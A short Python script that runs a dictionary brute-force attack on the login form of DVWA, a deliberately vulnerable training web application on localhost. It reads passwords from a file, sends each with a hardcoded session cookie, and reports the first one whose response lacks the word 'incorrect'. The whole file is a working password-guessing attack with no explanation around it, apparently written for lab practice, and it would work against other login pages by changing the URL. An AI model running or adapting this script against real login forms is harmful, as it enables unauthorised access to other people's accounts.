import requests

dict_file = 'passwords.txt'
user_name = 'admin'
headers = {'Cookie':'security=low; PHPSESSID=bn71qcm3ch0ugcoq1no7j3qm66','Referer':'http://localhost/dvwa/index.php'}

def get_http(u_name,p_word):
    url = "http://localhost/dvwa/vulnerabilities/brute/?username="+user_name+"&password="+p_word+"&Login=Login#"
    req = requests.get(url,headers=headers)
    return(url,req.status_code,req.text)

f = open(dict_file,'r')
for line in f:
    p_word = line.strip()
    url,status_code,result=get_http(user_name,p_word)
    if result.find('incorrect')==-1:
        print('[+]Login: '+p_word)
        f.close()
        break
    else:
        print('[-]: '+p_word)
